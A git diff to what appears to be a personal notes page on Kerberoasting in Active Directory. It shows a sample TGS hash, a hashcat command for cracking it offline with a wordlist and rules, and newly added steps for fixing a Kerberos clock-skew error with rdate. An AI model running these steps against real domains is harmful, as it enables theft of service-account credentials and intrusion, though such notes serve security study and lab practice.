@@ -34,7 +34,15 @@ $krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$9b161bcb9f98f19b.......a
 hashcat --help | grep -i "Kerberos"
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
-
+**Solving Error**
+`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`
+![image](https://github.com/user-attachments/assets/ac12a70c-6d6f-47ab-baca-79415d7c39f6)
+```shell
+sudo apt install rdate
+sudo timedatectl set-ntp off
+sudo rdate -n <Domain-IP>
+```
+Then Run Command again and will work
 ## **Perform Kerberoasting on `Windows` (joined domain):**
 By using use [Rubeus]([https://github.com/GhostPack/Rubeus](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/tree/main/Tools/GhostPack-Compiled%20Binaries)) 
 
